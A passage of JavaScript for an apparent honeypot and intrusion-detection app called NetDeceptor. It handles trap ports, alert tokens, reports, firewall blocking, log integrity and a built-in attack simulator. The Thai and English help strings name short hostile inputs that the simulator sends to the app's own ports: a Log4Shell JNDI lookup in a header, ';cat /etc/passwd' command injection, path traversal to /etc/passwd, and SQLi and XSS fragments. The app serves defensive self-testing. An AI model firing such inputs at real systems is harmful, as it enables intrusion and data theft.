  if (s === 'listening') return '<span class="text-[10px] px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-700 font-semibold">' + t('listening') + '</span>';
  if (s === 'off' || !s) return '<span class="text-[10px] px-2 py-0.5 rounded-full bg-slate-100 text-slate-500 font-semibold">' + t('off') + '</span>';
  return `<span class="text-[10px] px-2 py-0.5 rounded-full bg-rose-100 text-rose-700 font-semibold" title="${esc(s)}">${t('error')}</span>`;
}
function renderTraps() {
  const el = document.getElementById('trap-list');
  el.innerHTML = '';
  trapDraft.forEach((t, i) => {
    const row = document.createElement('div');
    row.className = 'p-3 rounded-xl border border-slate-200 bg-white grid grid-cols-12 gap-3 items-start';
    row.innerHTML = `
      <div class="col-span-12 md:col-span-1 flex md:flex-col items-center gap-2">
        <label class="flex items-center gap-1 text-xs font-semibold"><input type="checkbox" ${t.enabled ? 'checked' : ''} data-i="${i}" data-k="enabled"> ON</label>
        ${statusBadge(t.port)}
      </div>
      <div class="col-span-4 md:col-span-1"><label class="text-[10px] font-semibold text-slate-500">PORT</label>
        <input class="inp font-mono" type="number" min="1" max="65535" value="${esc(t.port)}" data-i="${i}" data-k="port"></div>
      <div class="col-span-8 md:col-span-3"><label class="text-[10px] font-semibold text-slate-500">SERVICE NAME</label>
        <input class="inp" value="${esc(t.service)}" data-i="${i}" data-k="service"></div>
      <div class="col-span-6 md:col-span-1"><label class="text-[10px] font-semibold text-slate-500">SEVERITY</label>
        <select class="inp" data-i="${i}" data-k="severity">
          <option ${t.severity === 'MEDIUM' ? 'selected' : ''}>MEDIUM</option><option ${t.severity === 'HIGH' ? 'selected' : ''}>HIGH</option></select></div>
      <div class="col-span-12 md:col-span-5"><label class="text-[10px] font-semibold text-slate-500">BANNER (sent to the intruder on connect)</label>
        <textarea class="inp font-mono" rows="2" data-i="${i}" data-k="banner">${esc(t.banner.replace(/\r\n/g, '\n'))}</textarea></div>
      <div class="col-span-12 md:col-span-1 text-right"><button class="text-rose-500 text-xs font-semibold" onclick="removeTrap(${i})"><i class="fa-solid fa-trash"></i></button></div>`;
    el.appendChild(row);
  });
  el.querySelectorAll('[data-k]').forEach(inp => {
    const upd = () => {
      const t = trapDraft[+inp.dataset.i], k = inp.dataset.k;
      t[k] = inp.type === 'checkbox' ? inp.checked : (k === 'port' ? parseInt(inp.value || 0) : inp.value);
    };
    inp.addEventListener('input', upd); inp.addEventListener('change', upd);
  });
  applyLang();
}
function addTrap() { trapDraft.push({ port: 2222, service: 'Custom Service', enabled: true, severity: 'MEDIUM', banner: '' }); renderTraps(); }
function removeTrap(i) { trapDraft.splice(i, 1); renderTraps(); }
async function saveTraps() {
  const r = await call('save_traps', JSON.stringify({ traps: trapDraft, bind_host: document.getElementById('bind-host').value }));
  if (!r.ok) return toast(r.error, false);
  state.config.traps = r.traps; state.status = r.status;
  state.config.bind_host = document.getElementById('bind-host').value;
  trapDraft = JSON.parse(JSON.stringify(r.traps));
  renderTraps(); updateActiveTraps();
  const errs = Object.values(r.status).filter(s => s.startsWith('error')).length;
  toast(errs ? (LANG === 'th' ? `ใช้การตั้งค่าแล้ว แต่เปิดพอร์ตไม่สำเร็จ ${errs} พอร์ต` : `Applied, but ${errs} port(s) failed to open`) : t('Trap config applied'), !errs);
}

// ---------- alerts ----------
function loadNotifyForm() {
  const n = state.config.notify;
  document.getElementById('n-enabled').checked = n.enabled;
  document.getElementById('n-sev').value = n.min_severity;
  document.getElementById('n-cool').value = n.cooldown_sec;
  document.getElementById('n-tg-token').value = n.telegram_token;
  document.getElementById('n-tg-chat').value = n.telegram_chat_id;
  document.getElementById('n-line-token').value = n.line_channel_token;
  document.getElementById('n-line-user').value = n.line_user_id;
}
async function saveNotify() {
  const r = await call('save_notify', JSON.stringify({
    enabled: document.getElementById('n-enabled').checked,
    min_severity: document.getElementById('n-sev').value,
    cooldown_sec: document.getElementById('n-cool').value || 0,
    telegram_token: document.getElementById('n-tg-token').value.trim(),
    telegram_chat_id: document.getElementById('n-tg-chat').value.trim(),
    line_channel_token: document.getElementById('n-line-token').value.trim(),
    line_user_id: document.getElementById('n-line-user').value.trim(),
  }));
  toast(r.ok ? t('Alert settings saved') : r.error, r.ok);
  return r.ok;
}
async function testNotify() {
  if (!(await saveNotify())) return;
  document.getElementById('n-result').textContent = t('Sending...');
  const res = await call('test_notify');
  document.getElementById('n-result').textContent = res.map(x => `${x.channel}: ${x.ok ? 'OK' : x.detail}`).join(' | ');
}

// ---------- reports ----------
async function loadReport() {
  const s = await call('get_stats', document.getElementById('r-range').value);
  document.getElementById('r-total').innerText = s.total;
  document.getElementById('r-unique').innerText = s.unique_ips;
  document.getElementById('r-high').innerText = s.high;
  const max = Math.max(1, ...s.hourly);
  document.getElementById('r-hourly').innerHTML = s.hourly.map((v, h) =>
    `<div class="flex-1 bg-cyber-blue/80 rounded-t" style="height:${Math.max(2, v / max * 100)}%" title="${String(h).padStart(2,'0')}:00 - ${v} attacks"></div>`).join('');
  document.getElementById('r-ips').innerHTML = s.top_ips.length
    ? s.top_ips.map(r => `<tr class="border-b border-slate-100"><td class="py-1.5">${esc(r.ip)}</td><td>${riskPill(r.score)}</td><td class="text-right font-bold">${r.hits}</td></tr>`).join('')
    : '<tr><td class="text-slate-400 py-2">' + t('No data yet') + '</td></tr>';
  document.getElementById('r-types').innerHTML = bars(s.top_types.map(x => [x.attack_type, x.hits]), typeLabel);
  document.getElementById('r-countries').innerHTML = bars(s.top_countries.map(x => [x.country_code, x.hits]), countryLabel);
}
async function doExport(fmt) {
  const r = await call('export_report', fmt, document.getElementById('r-range').value);
  if (r.ok) { toast(LANG === 'th' ? `บันทึก ${r.count} รายการ -> ${r.path}` : `Saved ${r.count} records -> ${r.path}`); if (r.note) setTimeout(() => toast(r.note, false), 3800); }
  else if (r.error !== 'cancelled') toast(r.error, false);
}

// ---------- flags, breakdowns, defense, integrity ----------
const typeCounts = {}, countryCounts = {};
let defenseState = null;
function flagHtml(cc) {
  if (cc === 'LAN') return '<span class="px-1 rounded bg-slate-100 text-slate-500 text-[10px] font-bold">LAN</span>';
  if (!/^[A-Za-z]{2}$/.test(cc || '')) return '';
  const c = cc.toLowerCase();
  return `<img src="https://flagcdn.com/24x18/${c}.png" width="20" height="15" class="inline rounded-sm align-text-bottom" alt="${cc}" onerror="this.replaceWith(document.createTextNode('${cc}'))">`;
}
function countryName(cc) {
  if (cc === 'LAN') return LANG === 'th' ? 'เครือข่ายภายใน' : 'Private network';
  try { return new Intl.DisplayNames([LANG], { type: 'region' }).of(cc.toUpperCase()); } catch (e) { return cc; }
}
function bars(entries, labelFn) {
  const max = Math.max(1, ...entries.map(e => e[1]));
  if (!entries.length) return '<div class="text-xs text-slate-400">' + esc(t('No data yet')) + '</div>';
  return entries.map(([k, v]) => `<div class="flex items-center gap-2 text-xs">
    <div class="w-44 truncate">${labelFn(k)}</div>
    <div class="flex-1 bg-slate-100 rounded h-2"><div class="bg-cyber-blue h-2 rounded" style="width:${v / max * 100}%"></div></div>
    <div class="font-mono font-bold w-12 text-right">${v}</div></div>`).join('');
}
const typeLabel = k => esc(t(k));
const countryLabel = k => flagHtml(k) + ' ' + esc(countryName(k));
function renderBreakdowns() {
  const top = o => Object.entries(o).sort((a, b) => b[1] - a[1]).slice(0, 6);
  document.getElementById('dash-types').innerHTML = bars(top(typeCounts), typeLabel);
  document.getElementById('dash-countries').innerHTML = bars(top(countryCounts), countryLabel);
}
function applyStats(s) {
  attackCount = s.total;
  document.getElementById('stat-total').innerText = s.total;
  document.getElementById('stat-last-ip').innerText = s.last_ip || t('None');
  for (const o of [portCounts, typeCounts, countryCounts]) for (const k in o) delete o[k];
  s.top_ports.forEach(p => portCounts[p.port] = p.hits);
  s.top_types.forEach(p => typeCounts[p.attack_type] = p.hits);
  s.top_countries.forEach(p => countryCounts[p.country_code] = p.hits);
  renderTopPort(); renderBreakdowns();
}
async function refreshDash() {   // re-sync with the DB: the UI may have been throttled during a flood
  if (!bridge || document.getElementById('tab-dash').classList.contains('hidden')) return;
  applyStats(await call('get_stats', 'all'));
  timeline = await call('get_timeline'); drawTimeline();
}

const BLOCK_STATUS = { blocked: 'blocked', dry_run: 'dry_run', failed: 'failed', protected: 'protected', unblocked: 'unblocked' };
function renderDefense(d) {
  defenseState = d;
  const df = d.defense, lm = d.limits;
  const set = (id, v) => { const el = document.getElementById(id); if (el.type === 'checkbox') el.checked = !!v; else el.value = v; };
  set('d-enabled', df.enabled); set('d-dry', df.dry_run); set('d-priv', df.protect_private);
  set('d-high', df.block_on_high); set('d-flood', df.block_on_flood);
  set('d-thr', df.threshold); set('d-win', df.window_sec); set('d-auto', df.auto_unblock_min);
  set('d-allow', df.allowlist.join('\n'));
  set('l-enabled', lm.enabled); set('l-rate', lm.per_ip_rate); set('l-burst', lm.per_ip_burst);
  set('l-conc', lm.max_concurrent); set('l-ui', lm.ui_max_per_sec);
  set('g-path', d.geo.db_path);
  document.getElementById('allow-chips').innerHTML = df.allowlist.length
    ? `<span class="text-[11px] text-slate-500 self-center">${esc(tr('wl_label'))}</span>` + df.allowlist.map(a =>
        `<span class="px-2 py-0.5 rounded-full bg-emerald-100 text-emerald-700 text-[11px] font-mono">${esc(a)} <button onclick="removeWhitelist('${esc(a)}')" title="remove">&times;</button></span>`).join('')
    : '';
  document.getElementById('g-status').textContent = 'GeoIP: ' + d.geo.status;
  document.getElementById('l-stats').textContent = LANG === 'th'
    ? `เชื่อมต่อที่ถูกตัดทิ้ง: ${d.dropped} | กำลังประมวลผล: ${d.active} | เหตุการณ์ UI ที่ถูกข้าม: ${d.ui_suppressed}`
    : `Dropped connections: ${d.dropped} | in flight: ${d.active} | UI events skipped: ${d.ui_suppressed}`;
  const badge = (txt, ok) => `<span class="px-2 py-0.5 rounded-full font-semibold ${ok ? 'bg-emerald-100 text-emerald-700' : 'bg-amber-100 text-amber-700'}">${esc(txt)}</span>`;
  document.getElementById('def-badges').innerHTML =
    badge(d.platform, d.platform === 'win32' || d.platform.startsWith('linux')) +
    badge(d.is_admin ? (LANG === 'th' ? 'สิทธิ์ผู้ดูแล: ใช่' : 'Admin: yes') : (LANG === 'th' ? 'สิทธิ์ผู้ดูแล: ไม่ใช่' : 'Admin: no'), d.is_admin);
  const body = document.getElementById('blk-body');
  body.innerHTML = d.blocks.length ? d.blocks.map(b => {
    const cls = b.status === 'blocked' ? 'text-rose-600' : b.status === 'failed' ? 'text-amber-600' : 'text-slate-500';
    const act = (b.status === 'blocked' ? `<button class="text-brand-600 font-semibold mr-3" onclick="unblock('${esc(b.ip)}')">${esc(t('Unblock'))}</button>` : '')
      + (['blocked', 'dry_run', 'failed'].includes(b.status) ? `<button class="text-emerald-600 font-semibold" onclick="whitelist('${esc(b.ip)}')">${esc(tr('whitelist'))}</button>` : '');
    return `<tr class="border-b border-slate-100"><td class="py-1.5 pr-3 font-bold">${esc(b.ip)}</td><td class="pr-3">${esc(b.ts)}</td>
      <td class="pr-3 font-sans">${esc(b.reason || '')}</td><td class="pr-3 ${cls}" title="${esc(b.detail || '')}">${esc(t(BLOCK_STATUS[b.status] || b.status))}</td><td>${act}</td></tr>`;
  }).join('') : `<tr><td colspan="5" class="text-slate-400 py-2 font-sans">${esc(t('No data yet'))}</td></tr>`;
  applyLang();
}
async function loadDefense() { renderDefense(await call('get_defense')); }
async function saveDefense() {
  const v = id => document.getElementById(id), c = id => v(id).checked, n = id => Number(v(id).value);
  const r = await call('save_defense', JSON.stringify({
    defense: { enabled: c('d-enabled'), dry_run: c('d-dry'), protect_private: c('d-priv'), block_on_high: c('d-high'),
               block_on_flood: c('d-flood'), threshold: n('d-thr'), window_sec: n('d-win'), auto_unblock_min: n('d-auto'),
               allowlist: v('d-allow').value.split('\n') },
    limits: { enabled: c('l-enabled'), per_ip_rate: n('l-rate'), per_ip_burst: n('l-burst'), max_concurrent: n('l-conc'), ui_max_per_sec: n('l-ui') },
    geo: { db_path: v('g-path').value },
  }));
  if (!r.ok) return toast(r.error, false);
  renderDefense(r.state);
  toast(LANG === 'th' ? 'บันทึกการตั้งค่าการป้องกันแล้ว' : 'Defense settings saved');
}
async function unblock(ip) {
  const r = await call('unblock_ip', ip);
  toast(r.ok ? (LANG === 'th' ? `ปลดบล็อก ${ip} แล้ว` : `Unblocked ${ip}`) : r.detail, r.ok);
  loadDefense();
}
function onDefenseEvent(ev) {                  // pushed from Python when the engine blocks / unblocks
  const th = LANG === 'th';
  const msg = { blocked: th ? 'บล็อก' : 'Blocked', dry_run: th ? 'จำลองการบล็อก' : 'Dry-run block',
                failed: th ? 'บล็อกไม่สำเร็จ' : 'Block failed', protected: th ? 'ไม่บล็อก (ป้องกันไว้)' : 'Not blocked (protected)',
                unblocked: th ? 'ปลดบล็อก' : 'Unblocked' }[ev.status] || ev.status;
  toast(`${msg}: ${ev.ip} - ${ev.detail || ev.reason}`, ev.status === 'blocked' || ev.status === 'dry_run' || ev.status === 'unblocked');
  if (!document.getElementById('tab-defense').classList.contains('hidden')) loadDefense();
}
async function verifyIntegrity() {
  const el = document.getElementById('integrity-result');
  el.textContent = '...';
  const r = await call('verify_integrity');
  const th = LANG === 'th';
  el.className = 'text-xs font-mono ' + (r.ok ? 'text-emerald-600' : 'text-rose-600');
  el.textContent = r.ok
    ? (th ? `ผ่านการตรวจสอบ: ${r.count} รายการ ห่วงโซ่ข้อมูลครบถ้วน | head ${r.head.substring(0, 16)}...`
          : `VERIFIED: ${r.count} records, chain intact | head ${r.head.substring(0, 16)}...`)
    : (th ? `ตรวจพบการแก้ไขข้อมูลที่รายการ #${r.broken_id}: ${r.reason}` : `TAMPERING DETECTED at record #${r.broken_id}: ${r.reason}`);
}

// ---------- timeline chart ----------
let timeline = { labels: [], data: [] };
function drawTimeline() {
  const c = document.getElementById('timelineCanvas');
  if (!c) return;
  const w = c.parentElement.clientWidth, h = 180;
  if (w < 60) return;                                  // tab hidden
  const dpr = window.devicePixelRatio || 1;
  c.width = w * dpr; c.height = h * dpr; c.style.width = w + 'px'; c.style.height = h + 'px';
  const g = c.getContext('2d'); g.setTransform(dpr, 0, 0, dpr, 0, 0); g.clearRect(0, 0, w, h);
  const data = timeline.data; if (data.length < 2) return;
  const padL = 34, padB = 20, padT = 10, padR = 8, max = Math.max(5, ...data);
  g.font = '10px JetBrains Mono, monospace';
  for (let i = 0; i <= 4; i++) {
    const y = padT + (h - padT - padB) * i / 4;
    g.strokeStyle = 'rgba(148,163,184,.35)'; g.beginPath(); g.moveTo(padL, y); g.lineTo(w - padR, y); g.stroke();
    g.fillStyle = '#64748B'; g.fillText(Math.round(max * (1 - i / 4)), 4, y + 3);
  }
  const X = i => padL + (w - padL - padR) * i / (data.length - 1), Y = v => padT + (h - padT - padB) * (1 - v / max);
  const line = new Path2D(); line.moveTo(X(0), Y(data[0]));
  for (let i = 1; i < data.length; i++) { const mx = (X(i - 1) + X(i)) / 2; line.bezierCurveTo(mx, Y(data[i - 1]), mx, Y(data[i]), X(i), Y(data[i])); }
  const area = new Path2D(line); area.lineTo(X(data.length - 1), h - padB); area.lineTo(X(0), h - padB); area.closePath();
  const fillG = g.createLinearGradient(0, padT, 0, h - padB);
  fillG.addColorStop(0, 'rgba(0,102,255,.28)'); fillG.addColorStop(1, 'rgba(0,102,255,0)');
  g.fillStyle = fillG; g.fill(area);
  const lineG = g.createLinearGradient(padL, 0, w - padR, 0); lineG.addColorStop(0, '#0066FF'); lineG.addColorStop(1, '#00A8FF');
  g.strokeStyle = lineG; g.lineWidth = 2; g.stroke(line);
  g.fillStyle = '#64748B';
  [0, 15, 30, 45, data.length - 1].forEach(i => { if (timeline.labels[i]) g.fillText(timeline.labels[i], Math.min(X(i) - 12, w - 36), h - 5); });
}
window.addEventListener('resize', () => setTimeout(drawTimeline, 80));

// ---------- bilingual strings for Help / Simulator / checklist ----------
const tr = k => (STR[LANG] && STR[LANG][k]) || STR.en[k] || k;
const kbd = x => `<span class="kbd">${x}</span>`;
const STR = {
  th: {
    help_title: 'ช่วยเหลือและเริ่มต้นใช้งาน', quick_title: 'Quick Start Wizard',
    quick_desc: 'แนะนำ 5 ขั้นตอนสั้นๆ: ตั้งพอร์ตกับดัก, สร้างโทเคน LINE/Telegram, และตั้งค่าไฟร์วอลล์',
    quick_btn: 'เริ่มวิซาร์ด', how_title: 'NetDeceptor ทำงานอย่างไร',
    how_desc: 'เลือกรูปแบบการโจมตี แล้วกด "จำลองการโจมตี" เพื่อดูการไหลของข้อมูลผ่านโค้ดจริงของระบบ (ไม่เขียนฐานข้อมูล ไม่ส่งข้อความ ไม่แตะไฟร์วอลล์) หรือคลิกแต่ละกล่องเพื่ออ่านคำอธิบาย',
    simulate: 'จำลองการโจมตี', real_traffic: 'ส่งทราฟฟิกจริงที่แท็บ Simulator →',
    sc_port_scan: 'สแกนพอร์ต', sc_ssh_brute: 'SSH Brute-force', sc_sqli: 'SQL Injection', sc_traversal: 'Directory Traversal',
    sc_log4shell: 'Log4Shell', sc_flood: 'DoS / Flood',
    check_title: 'รายการตรวจสอบระบบ (Troubleshooting)', check_desc: 'ตรวจสถานะส่วนประกอบสำคัญ พร้อมคำแนะนำเมื่อมีปัญหา',
    run_check: 'ตรวจสอบระบบ', run_online: 'ตรวจโทเคนออนไลน์', checking: 'กำลังตรวจสอบ...',
    c_db: 'การเชื่อมต่อ SQLite', c_chain: 'ความสมบูรณ์ของ Log (hash chain)', c_ports: 'พอร์ตกับดัก', c_admin: 'สิทธิ์ Administrator / Root',
    c_fwtool: 'เครื่องมือไฟร์วอลล์', c_defense: 'โหมดป้องกันเชิงรุก', c_limiter: 'Rate limiter', c_geo: 'GeoIP',
    c_telegram: 'Telegram Token', c_line: 'LINE Token', c_alerts: 'ระบบแจ้งเตือน', c_pdf: 'ส่งออก PDF (reportlab)', c_thaifont: 'ฟอนต์ไทยสำหรับ PDF', c_config: 'โฟลเดอร์ config / ฐานข้อมูล',
    hint_admin: 'เปิดโปรแกรมด้วย Run as administrator (Windows) หรือ sudo (Linux) หากต้องการบล็อก IP จริง',
    hint_geo: 'วางไฟล์ GeoLite2-City.mmdb ไว้ข้างโปรแกรม แล้ว pip install geoip2',
    hint_ports: 'พอร์ตต่ำกว่า 1024 ต้องใช้สิทธิ์ผู้ดูแล หรือพอร์ตถูกใช้งานอยู่แล้ว ดูแท็บ Trap Config',
    hint_alerts: 'ใส่โทเคนที่แท็บ Alerts แล้วกดส่งข้อความทดสอบ', hint_pdf: 'pip install reportlab',
    hint_fw: 'ติดตั้ง/เปิดใช้เครื่องมือไฟร์วอลล์ของระบบ', hint_font: 'วาง THSarabunNew.ttf และ "THSarabunNew Bold.ttf" ในโฟลเดอร์ fonts/',
    hint_chain: 'ข้อมูลใน DB ถูกแก้ไขหรือลบ — ตรวจที่แท็บ Reports', hint_cfg: 'ย้ายโปรแกรมไปโฟลเดอร์ที่เขียนไฟล์ได้',
    not_run: 'ยังไม่ได้ตรวจ — กด "ตรวจสอบระบบ"', online_wait: 'กำลังตรวจโทเคนออนไลน์...', online_none: 'ยังไม่ได้ตั้งค่าโทเคนใดๆ ให้ตรวจออนไลน์',
    sim_title: 'ตัวจำลองการโจมตี (Attack Simulator)',
    sim_desc: 'กดปุ่มเพื่อส่งทราฟฟิกจริงจากเครื่องนี้ไปยังพอร์ตกับดักของตัวเอง (127.0.0.1) ระบบจะจำแนก บันทึก แจ้งเตือน และจำกัดอัตราเหมือนโดนโจมตีจริง ผลจะขึ้นที่แดชบอร์ดแบบเรียลไทม์',
    sim_note: 'หมายเหตุ: เป็นการจำลองในตัวโปรแกรม ไม่ได้เรียก nmap/hydra จริง และเพราะต้นทางคือ 127.0.0.1 ระบบป้องกันจะไม่บล็อกที่อยู่นี้ (ตามที่ออกแบบไว้) — ส่วนการบล็อกให้ดูในแท็บ "ช่วยเหลือ" ที่ปุ่มจำลองการโจมตี',
    sim_running: 'กำลังรันการจำลอง...', sim_term: 'เทอร์มินัลจำลอง', sim_clear: 'ล้างหน้าจอ', sim_idle: 'พร้อม — เลือกรูปแบบการโจมตีด้านบน',
    sim_port_scan_d: 'สแกนพอร์ตแบบ TCP connect ไล่พอร์ตกับดักทั้งหมด', sim_ssh_brute_d: 'ลองรหัสผ่าน 8 ครั้งที่พอร์ต 22 → Brute-force',
    sim_ftp_brute_d: 'ส่ง USER/PASS ไปที่ FTP พอร์ต 21', sim_sqli_d: 'ส่ง UNION SELECT ไปที่เว็บปลอมพอร์ต 80',
    sim_traversal_d: 'พยายามอ่าน /etc/passwd ผ่าน ../', sim_log4shell_d: 'ฝัง ${jndi:ldap://...} ใน header',
    sim_cmdi_d: 'แทรกคำสั่ง ;cat /etc/passwd', sim_xss_d: 'ส่ง <script> ผ่าน query string', sim_rdp_d: 'ส่ง cookie mstshash ของ RDP',
    sim_flood_d: 'ยิง 60 การเชื่อมต่อรัวๆ เพื่อทดสอบ Rate Limiter → DoS / Flood', sim_full_d: 'รันทุกอย่างต่อเนื่อง เหมาะกับเดโม/อัดวิดีโอ',
    sc_cmdi: 'Command Injection', sc_xss: 'XSS', sc_rdp: 'RDP Login', sc_ftp_brute: 'FTP Login', sc_full: 'รันเดโมเต็มรูปแบบ',
    wl_label: 'รายการยกเว้น:', whitelist: 'ยกเว้น (Whitelist)',
    node_attacker: 'ผู้โจมตี', node_port: 'พอร์ตกับดัก', node_limit: 'Rate Limit', node_classify: 'จำแนก+ให้คะแนน', node_geo: 'GeoIP', node_db: 'SQLite+Hash', node_alert: 'แจ้งเตือน', node_fw: 'ไฟร์วอลล์',
    info_attacker: 'ใครก็ตามที่สแกนหรือเจาะเข้ามา ทุกการเชื่อมต่อเข้าพอร์ตกับดักถือว่าน่าสงสัย เพราะไม่มีผู้ใช้จริงใช้บริการเหล่านี้',
    info_port: 'asyncio เปิดพอร์ตปลอม (FTP/SSH/HTTP/SMB/RDP) ส่ง banner หลอก แล้วอ่านข้อมูลที่ผู้โจมตีส่งมาไม่เกิน 1 KB',
    info_limit: 'Token bucket แยกตาม IP จำกัดความถี่ ผู้ถล่มถูกตัดทิ้งทันทีและบันทึกเป็นเหตุการณ์ DoS เพียงรายการเดียว เพื่อไม่ให้ระบบและหน้าจอกระตุก',
    info_classify: 'Regex เช็ก signature (SQLi, Traversal, Log4Shell ฯลฯ) และพฤติกรรม (Port Scan, Brute-force) แล้วคำนวณ Threat Score 0-100',
    info_geo: 'หาประเทศต้นทางจาก IP แบบออฟไลน์ด้วย GeoLite2 ไม่ส่ง IP ออกไปบริการภายนอก',
    info_db: 'บันทึกลง SQLite โดยแฮช SHA-256 ผูกกับรายการก่อนหน้า ถ้ามีใครแก้หรือลบข้อมูล ห่วงโซ่จะขาดและตรวจพบได้',
    info_alert: 'ส่งข้อความผ่าน Telegram Bot / LINE Messaging API ตามระดับความรุนแรงและ cooldown ต่อ IP',
    info_fw: 'ถ้าเข้าเกณฑ์ ระบบสั่ง netsh / iptables บล็อก IP (ยกเว้น LAN/loopback/allowlist) ค่าเริ่มต้นเป็นโหมดจำลอง',
    pick_node: 'คลิกกล่องใดก็ได้เพื่ออ่านคำอธิบาย', running_trace: 'กำลังไหลผ่านระบบ...',
    wiz_step: 'ขั้นตอน', wiz_back: 'ย้อนกลับ', wiz_next: 'ถัดไป', wiz_done: 'เสร็จสิ้น', wiz_skip: 'ข้าม',
    open_traps: 'เปิดหน้า Trap Config', open_alerts: 'เปิดหน้า Alerts', open_defense: 'เปิดหน้า Defense', open_help: 'ไปหน้ารายการตรวจสอบ', open_sim: 'ลองเครื่องจำลอง',
  },
  en: {
    help_title: 'Help & Onboarding', quick_title: 'Quick Start Wizard',
    quick_desc: 'A 5-step walkthrough: honeypot ports, LINE / Telegram tokens and firewall setup.',
    quick_btn: 'Start wizard', how_title: 'How NetDeceptor works',
    how_desc: 'Pick an attack and press "Simulate attack" to watch it flow through the real logic (no DB writes, no messages sent, firewall untouched). Or click any box for an explanation.',
    simulate: 'Simulate attack', real_traffic: 'Send real traffic from the Simulator tab →',
    sc_port_scan: 'Port Scan', sc_ssh_brute: 'SSH Brute-force', sc_sqli: 'SQL Injection', sc_traversal: 'Directory Traversal',
    sc_log4shell: 'Log4Shell', sc_flood: 'DoS / Flood',
    check_title: 'Troubleshooting checklist', check_desc: 'Status of the key components, with a fix hint when something is off.',
    run_check: 'Run self-check', run_online: 'Verify tokens online', checking: 'Checking...',
    c_db: 'SQLite connection', c_chain: 'Log integrity (hash chain)', c_ports: 'Trap ports', c_admin: 'Administrator / Root rights',
    c_fwtool: 'Firewall tool', c_defense: 'Active defense mode', c_limiter: 'Rate limiter', c_geo: 'GeoIP',
    c_telegram: 'Telegram token', c_line: 'LINE token', c_alerts: 'Alert notifications', c_pdf: 'PDF export (reportlab)', c_thaifont: 'Thai font for PDF', c_config: 'Config / database folder',
    hint_admin: 'Start the program with Run as administrator (Windows) or sudo (Linux) to block IPs for real.',
    hint_geo: 'Put GeoLite2-City.mmdb next to the program, then pip install geoip2.',
    hint_ports: 'Ports below 1024 need admin rights, or the port is already in use. See Trap Config.',
    hint_alerts: 'Enter a token in the Alerts tab, then send a test message.', hint_pdf: 'pip install reportlab',
    hint_fw: 'Install / enable your OS firewall tool.', hint_font: 'Put THSarabunNew.ttf and "THSarabunNew Bold.ttf" in ./fonts.',
    hint_chain: 'Rows in the DB were edited or deleted - see the Reports tab.', hint_cfg: 'Move the program to a writable folder.',
    not_run: 'Not run yet - press "Run self-check"', online_wait: 'Verifying tokens online...', online_none: 'No token configured, nothing to verify online.',
    sim_title: 'Attack Simulator',
    sim_desc: 'Each button sends real TCP traffic from this machine to its own honeypot ports (127.0.0.1). The pipeline classifies, logs, alerts and rate-limits exactly as it would for an outside attacker, and the Dashboard updates live.',
    sim_note: 'Note: this is a built-in imitation, not the real nmap/hydra. Because the source is 127.0.0.1, active defense will not block it (by design) - see the Help tab for the blocking flow demo.',
    sim_running: 'Simulation running...', sim_term: 'Simulator terminal', sim_clear: 'Clear', sim_idle: 'Ready - pick an attack above',
    sim_port_scan_d: 'TCP connect scan across all trap ports', sim_ssh_brute_d: '8 password guesses on port 22 → Brute-force',
    sim_ftp_brute_d: 'USER/PASS attempts on FTP port 21', sim_sqli_d: 'UNION SELECT against the fake web server on port 80',
    sim_traversal_d: 'Try to read /etc/passwd through ../', sim_log4shell_d: 'Plant ${jndi:ldap://...} in a header',
    sim_cmdi_d: 'Inject ;cat /etc/passwd', sim_xss_d: 'Send <script> in the query string', sim_rdp_d: 'Send an RDP mstshash cookie',
    sim_flood_d: 'Fire 60 rapid connections to exercise the rate limiter → DoS / Flood', sim_full_d: 'Runs everything back-to-back - ideal for demos / screen recordings',
    sc_cmdi: 'Command Injection', sc_xss: 'XSS', sc_rdp: 'RDP Login', sc_ftp_brute: 'FTP Login', sc_full: 'Run full demo',
    wl_label: 'Allowlist:', whitelist: 'Whitelist',
    node_attacker: 'Attacker', node_port: 'Trap port', node_limit: 'Rate limit', node_classify: 'Classify + score', node_geo: 'GeoIP', node_db: 'SQLite + hash', node_alert: 'Alert', node_fw: 'Firewall',
    info_attacker: 'Anyone scanning or probing. Every connection to a trap port is suspicious because no real user uses these fake services.',
    info_port: 'asyncio opens fake FTP/SSH/HTTP/SMB/RDP ports, sends a decoy banner, then reads up to 1 KB of whatever the attacker sends.',
    info_limit: 'A per-IP token bucket. Floods are cut off instantly and logged as ONE DoS event so neither the engine nor the UI stutters.',
    info_classify: 'Regex signatures (SQLi, traversal, Log4Shell...) plus behaviour rules (port scan, brute-force), then a 0-100 Threat Score.',
    info_geo: 'Finds the source country offline with GeoLite2. IPs are never sent to an outside service.',
    info_db: 'Stored in SQLite with a SHA-256 hash chained to the previous record. Edit or delete a row and the chain breaks.',
    info_alert: 'Pushes a message through Telegram Bot / LINE Messaging API, filtered by severity and a per-IP cooldown.',
    info_fw: 'If the rules match, netsh / iptables blocks the IP (never LAN, loopback or allowlisted). Dry-run is the default.',
    pick_node: 'Click any box to read what it does', running_trace: 'Flowing through the pipeline...',
    wiz_step: 'Step', wiz_back: 'Back', wiz_next: 'Next', wiz_done: 'Finish', wiz_skip: 'Skip',
    open_traps: 'Open Trap Config', open_alerts: 'Open Alerts', open_defense: 'Open Defense', open_help: 'Go to checklist', open_sim: 'Try the simulator',
  },
};
const NODES = [['attacker', 'fa-bug'], ['port', 'fa-door-open'], ['limit', 'fa-gauge-high'], ['classify', 'fa-filter'],
               ['geo', 'fa-earth-asia'], ['db', 'fa-database'], ['alert', 'fa-bell'], ['fw', 'fa-ban']];
const STEP_TO_NODE = { capture: 'port', ratelimit: 'limit', classify: 'classify', geo: 'geo', db: 'db', notify: 'alert', defense: 'fw' };

// ---------- terminal typing ----------
function termPrint(el, text, cls = '') {
  const line = document.createElement('div');
  line.className = 'term-line ' + cls;
  el.appendChild(line);
  el._pending = (el._pending || 0) + 1;
  const fast = el._pending > 20 || text.length === 0;
  el._chain = (el._chain || Promise.resolve()).then(() => new Promise(res => {
    if (fast) { line.textContent = text; el._pending--; el.scrollTop = el.scrollHeight; return res(); }
    let i = 0;
    const id = setInterval(() => {
      i = Math.min(text.length, i + 3); line.textContent = text.slice(0, i); el.scrollTop = el.scrollHeight;
      if (i >= text.length) { clearInterval(id); el._pending--; res(); }
    }, 10);
  }));
}

// ---------- Simulator tab ----------
let simRunning = false;
const SIM_ORDER = ['port_scan', 'ssh_brute', 'ftp_brute', 'sqli', 'traversal', 'log4shell', 'cmdi', 'xss', 'rdp', 'flood'];
function renderSim() {
  const root = document.getElementById('sim-root');
  const keep = document.getElementById('sim-term') ? document.getElementById('sim-term').innerHTML : null;
  root.innerHTML = `
    <div class="glass-panel rounded-2xl p-5 space-y-3">
      <div class="flex flex-wrap items-start justify-between gap-3">
